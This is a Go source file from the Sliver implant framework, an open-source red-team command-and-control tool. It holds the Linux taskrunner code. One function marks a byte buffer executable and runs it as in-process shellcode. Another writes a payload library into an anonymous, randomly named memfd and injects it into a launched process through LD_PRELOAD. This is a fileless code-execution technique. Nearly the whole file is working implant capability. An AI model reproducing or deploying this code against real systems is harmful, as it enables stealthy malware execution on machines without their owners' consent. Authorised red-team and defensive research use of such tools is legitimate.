package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"io/ioutil"
	insecureRand "math/rand"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	//{{if .Debug}}
	"log"
	//{{end}}
)

// LocalTask - Run a shellcode in the current process
// Will hang the process until shellcode completion
func LocalTask(data []byte, rwxPages bool) error {
	dataAddr := uintptr(unsafe.Pointer(&data[0]))
	page := getPage(dataAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	dataPtr := unsafe.Pointer(&data)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	go func(fPtr func()) {
		fPtr()
	}(funcPtr)
	return nil
}

// RemoteTask -
func RemoteTask(processID int, data []byte, rwxPages bool) error {
	return nil
}

// Sideload - Side load a library and return its output
func Sideload(procName string, data []byte, args string) (string, error) {
	var (
		nrMemfdCreate int
		stdOut        bytes.Buffer
		stdErr        bytes.Buffer
	)
	memfdName := randomString(8)
	memfd, err := syscall.BytePtrFromString(memfdName)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Error during conversion: %s\n", err)
		//{{end}}
		return "", err
	}
	if runtime.GOARCH == "386" {
		nrMemfdCreate = 356
	} else {
		nrMemfdCreate = 319
	}
	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
	pid := os.Getpid()
	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
	err = ioutil.WriteFile(fdPath, data, 0755)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Error writing file to memfd: %s\n", err)
		//{{end}}
		return "", err
	}
	//{{if .Debug}}
	log.Printf("Data written in %s\n", fdPath)
	//{{end}}
	env := []string{
		fmt.Sprintf("LD_PARAMS=%s", args),
		fmt.Sprintf("LD_PRELOAD=%s", fdPath),
		fmt.Sprintf("PATH=%s", os.Getenv("PATH")),
	}
	cmd := exec.Command(procName)
	cmd.Env = env
	cmd.Stdout = &stdOut
	cmd.Stderr = &stdErr
	//{{if .Debug}}
	log.Printf("Starging %s\n", cmd.String())
	//{{end}}
	go startAndWait(cmd)
	// Wait for process to terminate
	for {
		if cmd.ProcessState != nil {
			break
		}
	}
	if len(stdErr.Bytes()) > 0 {
		return "", fmt.Errorf(stdErr.String())
	}
	//{{if .Debug}}
	log.Printf("Done, stdout: %s\n", stdOut.String())
	log.Printf("Done, stderr: %s\n", stdErr.String())
	//{{end}}
	return stdOut.String(), nil
}

func startAndWait(cmd *exec.Cmd) {
	cmd.Start()
	cmd.Wait()
}

// Utility functions

func stringWithCharset(length int, charset string) string {
	seededRand := insecureRand.New(insecureRand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func randomString(length int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	return stringWithCharset(length, charset)
}

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}
